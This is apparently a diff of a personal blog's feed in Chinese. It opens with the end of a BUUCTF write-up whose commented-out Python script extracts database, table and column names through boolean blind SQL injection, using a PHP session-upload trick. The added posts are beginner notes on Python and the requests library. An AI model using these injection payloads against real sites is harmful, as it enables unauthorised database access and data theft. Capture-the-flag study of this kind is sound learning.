&#39;test&#39;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         r = requests.post(url=url,params=payload_column,files=files, data=&amp;#123;&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;: &#34;123456789&#34;&amp;#125;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#                   cookies=&amp;#123;&#34;PHPSESSID&#34;: &#34;test1&#34;&amp;#125;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         print(payload_column)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         if &#39;&amp;lt;meta http-equiv=&#34;refresh&#34; content=&#34;0; url=?p=home&#34; /&gt;&#39; in r.text:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#             low = mid +1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         else:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#             high = mid&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         mid = (low + high) // 2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     if(mid==32 or mid == 132):&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     column +=chr(mid)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     print(column)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# print(column)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# &#39;&#39;&#39; 表名 &#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# table=&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# for i in range(1,100):&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     low = 32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     high = 128&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     mid = (low+high)//2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     while (low &amp;lt; high):&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         time.sleep(0.06)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         payload_table =&amp;#123;&#39;username&#39;: &#39;test&#34; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#39;ptbctf\&#39;),&amp;#123;0&amp;#125;,1))&gt;&amp;#123;1&amp;#125;) #&#39;.format(i, mid),&#39;password&#39;: &#39;test&#39;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;69&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         r = requests.post(url=url,params=payload_table,files=files, data=&amp;#123;&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;: &#34;123456789&#34;&amp;#125;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;70&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#                   cookies=&amp;#123;&#34;PHPSESSID&#34;: &#34;test1&#34;&amp;#125;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;71&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         print(payload_table)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;72&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         if &#39;&amp;lt;meta http-equiv=&#34;refresh&#34; content=&#34;0; url=?p=home&#34; /&gt;&#39; in r.text:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;73&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#             low = mid +1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;74&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         else:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;75&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#             high = mid&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;76&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         mid = (low + high) // 2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;77&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     if(mid==32 or mid == 132):&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;78&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;79&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     table+=chr(mid)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;80&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     print(table)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;81&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;82&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# print(table)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;83&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;84&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# &#39;&#39;&#39; 数据库名 &#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;85&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# database=&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;86&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# for i in range(1,100):&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;87&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     low = 32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;88&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     high = 128&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;89&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     mid = (low+high)//2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;90&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     while (low &amp;lt; high):&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;91&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         time.sleep(0.06)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;92&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         payload_database =&amp;#123;&#39;username&#39;: &#39;test&#34; or (ascii(substr((select database()),&amp;#123;0&amp;#125;,1))&gt;&amp;#123;1&amp;#125;) #&#39;.format(i, mid),&#39;password&#39;: &#39;test&#39;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;93&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         r = requests.post(url=url,params=payload_database,files=files, data=&amp;#123;&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;: &#34;123456789&#34;&amp;#125;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;94&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#                   cookies=&amp;#123;&#34;PHPSESSID&#34;: &#34;test1&#34;&amp;#125;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;95&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         print(payload_database)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;96&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         if &#39;&amp;lt;meta http-equiv=&#34;refresh&#34; content=&#34;0; url=?p=home&#34; /&gt;&#39; in r.text:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;97&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#             low = mid +1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;98&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         else:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;99&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#             high = mid&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;100&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         mid = (low + high) // 2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;101&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     if(mid==32 or mid == 132):&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;102&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;103&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     database+=chr(mid)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;104&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     print(database)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;105&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;106&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# print(database)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVvL2FydGljbGUvZGV0YWlscy8xMDg5NjcyNDg=&#34;&gt;https://blog.csdn.net/SopRomeo/article/details/108967248&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="session伪造" />
+        <category term="sql盲注" />
+        <updated>2024-10-15T07:34:26.000Z</updated>
     </entry>
     <entry>
         <id>http://odiws.github.io/2024/04/28/2_1/</id>
@@ -1265,6 +1294,128 @@ IP地址转换成十进制：
         <updated>2024-04-28T14:45:54.000Z</updated>
     </entry>
     <entry>
+        <id>http://odiws.github.io/2024/01/24/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
+        <title>python学习笔记（未完）</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/01/24/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+        <content type="html">&lt;p&gt;Python 笔记&lt;br&gt;
+ 1.python 中的缩进是有严格规定的&lt;br&gt;
+ 2.Python 有控制台应用程序和 GUI（图形化用户界面）应用程序两种&lt;br&gt;
+ 3.GUI 应用程序主要用 Tkinter 和 PyQt 两种，前者自带，后者需安装。&lt;br&gt;
+4. 输入输出：&lt;br&gt;
+（a）输入：变量 = input (” 文本（可以不写，在文本之后输入）”)&lt;br&gt;
+ 注意：该输入的变量将自动变成字符串，若需要别的类型，则可以强制转换&lt;br&gt;
+（b）输出：print (“文本 %.x 格式化字符” % 变量（若需要计算，要用大括号括住）)&lt;br&gt;
+ 5.（1）pyhon 中的主函数入口：&lt;br&gt;
+if &lt;strong&gt;name&lt;/strong&gt;==”&lt;strong&gt;main&lt;/strong&gt;”:&lt;br&gt;
+5  （2）注释：&lt;br&gt;
+单行注释（#）和多行注释（“””   ”””）与（‘’’   ’’’）&lt;br&gt;
+6.chr 函数：将数字所对应的 ASCII 表字符表示出来&lt;br&gt;
+ 7.ord 函数：将 ASCII 表字符用数字表示&lt;br&gt;
+ 8. 将 print 函数写入到文件中&lt;br&gt;
+ fp=open (‘文件名’，’w’)# 打开文件 w-&amp;gt;write&lt;br&gt;
+print (‘北京欢迎你’,file=fp)  #将北京欢迎你输出到文件中&lt;br&gt;
+ fp.close ()# 关闭文件&lt;br&gt;
+ 9. 转义字符与原字符：&lt;br&gt;
+转义字符：\n    \t    \”    \’    \（一个反斜杠）&lt;br&gt;
+原字符：r 或 R 表示，使得字符串里面的转义字符失效。print (R” 北 \n 京 \n 欢 \n 迎 \n 你”) 将输出北 \n 京 \n 欢 \n 迎 \n 你&lt;br&gt;
+ 10.eval 函数：经常与 input 函数使用，可用于 变量 = eval (字符串)，用于去掉字符串最外面的引号，并按照 Python 语句方式执行引号后的字符串&lt;br&gt;
+ 11. 逻辑运算符：在 python 有 and ， or ， not 三种（true 和 false 也行）&lt;br&gt;
+选择结构：&lt;br&gt;
+1. 语法：if 条件：&lt;br&gt;
+执行什么指令&lt;br&gt;
+ else 条件：&lt;br&gt;
+执行什么指令&lt;br&gt;
+ 2. 语法：if 条件：&lt;br&gt;
+执行什么指令&lt;br&gt;
+ elif 条件：&lt;br&gt;
+执行什么指令&lt;br&gt;
+可以用 n 个 elif 指令&lt;br&gt;
+ else 条件：&lt;br&gt;
+执行什么指令&lt;br&gt;
+循环结构&lt;br&gt;
+ For 语法：for 循环变量 in 遍历对象：&lt;br&gt;
+语句块&lt;br&gt;
+ For・・・else・・・语法：                                   for 循环变量 in 遍历对象：&lt;br&gt;
+（意思是正常结束就执行 else 中的代码块）                    语句块 1&lt;br&gt;
+else：&lt;br&gt;
+语句块 2&lt;br&gt;
+While 语法：while 表达式：&lt;br&gt;
+语句块&lt;br&gt;
+ While 循环的四个步骤：&lt;br&gt;
+1）初始化变量&lt;br&gt;
+ 2）条件判断&lt;br&gt;
+ 3）语句块&lt;br&gt;
+ 4）改变变量&lt;br&gt;
+ While・・・else・・・语法：（意思是正常结束就执行 else 中的代码块）&lt;br&gt;
+While 表达式：&lt;br&gt;
+语句块 1&lt;br&gt;
+Else：&lt;br&gt;
+语句块 2&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;                                   序列
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;1. 序列的创建：&lt;br&gt;
+序列是一个用于存储多个值的连续空间，每个值都对应一个整数的编号，称为索引。&lt;br&gt;
+索引包含正向递增索引和反向递减索引&lt;br&gt;
+ 2. 序列包含列表，元组，字典，集合四种，成为组合数据类型&lt;br&gt;
+ 3. 序列的索引的语法结构：&lt;br&gt;
+序列 [start🔚step]（start 是开始的地方，end 是结束的地方）（开始包含，结束不包含，步长不写通常为 1 步）&lt;br&gt;
+（1）列表&lt;br&gt;
+ 1. 特点：&lt;br&gt;
+是一系列的按特定顺序排列的元素组成；&lt;br&gt;
+是可变的；&lt;br&gt;
+在 python 中使用 [] 定义列表，元素和元素之间使用英文的逗号连接分隔；&lt;br&gt;
+列表的元素可以是任意的数据类型。&lt;br&gt;
+2. 列表的创建：&lt;br&gt;
+1）使用 [] 直接创建列表：语法如下：&lt;br&gt;
+列表名 =[元素 1, 元素 2, 元素 3, 元素 n]&lt;br&gt;
+ 2）使用 list () 函数创建列表：语法如下：&lt;br&gt;
+列表名 = list (序列)&lt;br&gt;
+ 3）列表的删除：语法结构如下：&lt;br&gt;
+del 列表名&lt;br&gt;
+ 3.enumerate 函数的使用语法结构：&lt;br&gt;
+For index,item in enumerate(lst):&lt;br&gt;
+ 输出 index 和 item&lt;br&gt;
+ 列表的遍历操作：&lt;br&gt;
+1.for i in 列表名:&lt;br&gt;
+print(i)&lt;br&gt;
+ 2.For i in range (0, len (列表名))：&lt;br&gt;
+Print(i,item)&lt;br&gt;
+ 3.For index,item in enumerate (列表名):&lt;br&gt;
+Print(index, item)&lt;br&gt;
+ 列表的特有操作&lt;br&gt;
+假设列表名为 lst&lt;br&gt;
+Lst.append (x) ------------------- 在列表 lst 最后增加一个元素&lt;br&gt;
+ Lst.insert (index,x) -------------------- 在列表中第 index 个位置增加一个元素&lt;br&gt;
+ Lst.clear () -------------------------- 清除列表 lst 中的所有元素&lt;br&gt;
+ Lst.pop (index) ----------------------- 将列表 lst 中第 index 位置的元素取出，并从列表中将其删除&lt;br&gt;
+ Lst.remove (x) ----------------------- 将列表 lst 中出现的第一个元素 x 删除&lt;br&gt;
+ lst.reverse (x) ---------------------- 将列表 lst 中的元素反转&lt;br&gt;
+ Lst.copy () ------------------------- 拷贝列表 lst 列表中的所有元素，生成一个新的列表&lt;br&gt;
+列表的排序：&lt;br&gt;
+1. 列表对象的 sort 方法：&lt;br&gt;
+Lst.sort (key=None,reverse=False)（key 表示排序的规则，reverse 表示排序方式（默认升序））&lt;br&gt;
+2. 内置函数 sorted ()&lt;br&gt;
+ Sorted (iterable,key=None,reverse=False)（iterable 表示的是排序的对象）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;                      列表生成式
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;语法结构：&lt;br&gt;
+Lst=[expression for item in range]&lt;br&gt;
+Lst=[expression for item in range if condition]&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;                      二维列表 ：
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;二维列表的遍历：&lt;br&gt;
+For row in 二维列表：&lt;br&gt;
+For item in row：&lt;br&gt;
+Print(item,end=’t’)&lt;br&gt;
+ Print ()   #换行&lt;br&gt;
+ #列表生成式生成一个 4 行 5 列的二维列表&lt;br&gt;
+ lst2 = [[j for j in range (5)] for i in range (4)]&lt;br&gt;
+print(lst2)&lt;/p&gt;
+</content>
+        <category term="python" />
+        <updated>2024-01-24T03:05:44.000Z</updated>
+    </entry>
+    <entry>
         <id>http://odiws.github.io/2024/01/24/mysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
         <title>mysql学习笔记</title>
         <link rel="alternate" href="http://odiws.github.io/2024/01/24/mysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
@@ -1392,6 +1543,142 @@ Mysqli_close($link);&lt;/p&gt;
 </content>
         <category term="mysql" />
         <updated>2024-01-24T03:01:28.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://odiws.github.io/2024/01/24/python-requests%E5%BA%93flask%E5%BA%93%EF%BC%88%E6%9C%AA%E5%AE%8C%EF%BC%89/</id>
+        <title>python-requests库flask库（未完）</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/01/24/python-requests%E5%BA%93flask%E5%BA%93%EF%BC%88%E6%9C%AA%E5%AE%8C%EF%BC%89/"/>
+        <content type="html">&lt;pre&gt;&lt;code&gt;    HTTP协议：超文本传输协议，是一个基于“请求于响应”模式的，无状态的应用层协议。
+    HTTP协议采用URL作为定位网络资源的标识。
+    URL格式：http://host[:port][path]
+    Host:合法的internet主机域名或IP地址
+    Port：端口号，可以省略，省略则是80
+    Path:请求资源的路径。 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Request 库的常见用法：&lt;br&gt;
+r = requests.get(url,params=None,**kwargs)&lt;br&gt;
+（url：拟获取页面的 url 链接；params:url 中的额外参数，字典或字节流格式，可选，**kwargs:12 个控制访问的参数）&lt;br&gt;
+两个对象：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;reponse: 是上文 requests 的位置；request 是上文的 get 的位置。&lt;br&gt;
+属性	             说明&lt;br&gt;
+ r.status_code	HTTP 请求的返回状态，200 表示链接成功，404 表示失败。&lt;br&gt;
+r.text	HTTP 响应内容的字符串形式，即，url 对应的页面内容&lt;br&gt;
+ r.encodiing	从 HTTP header 中猜测的响应内容编码方式&lt;br&gt;
+ r.apparent_encoding	从内容中分析出的响应内容编码方式（备选编码方式）&lt;br&gt;
+r.content	HTTP 响应内容的二进制形式&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;requests 库的异常：&lt;br&gt;
+异常	说明&lt;br&gt;
+ requests.ConnectionError	网络连接错误异常，如 DNS 查询失败，拒接链接等&lt;br&gt;
+ requests.HTTPError	HTTP 错误异常&lt;br&gt;
+ requests.URLRequired	URL 缺失异常&lt;br&gt;
+ requests.TooManyRedirects	超过最大重定向次数，产生重定向异常&lt;br&gt;
+ requests.ConnectTimeout	连接远程服务器超市异常&lt;br&gt;
+ requests.Timeout	请求 URL 超时，产生超时异常&lt;br&gt;
+ r.raise_for_status ()	如果不是 200，产生异常 requests.HTTPError&lt;/p&gt;
+&lt;p&gt;requests 库的 7 个主要方法：&lt;br&gt;
+方法	                  说明&lt;br&gt;
+ requests.request ()	构建一个请求，支持一下个方法的基础方法&lt;br&gt;
+ requests.get ()	获取 HTML 网页的主要方法，对应于 HTTP&lt;br&gt;
+requests.head ()	获取 HTML 网页头信息的方法，对应于 HTTP 的 HEAD&lt;br&gt;
+requests.post ()	向 HTML 网页提交 POST 请求的方法，对应于 HTTP 的 POST&lt;br&gt;
+requests.put ()	向 HTML 网页提交 PUT 请求的方法，对应与 HTTP 的 PUT&lt;br&gt;
+requests.patch ()	向 HTML 网页提交局部修改请求，对应于 HTTP 的 PATCH&lt;br&gt;
+requests.delete ()	向 HTML 页面提交删除请求，对应于 HTTP 的 DELETE&lt;/p&gt;
+&lt;p&gt;（1）requests.request()&lt;br&gt;
+ 函数原型：requests.request (method，url，**kwargs)  //method 就是单引号中写下表的操作&lt;br&gt;
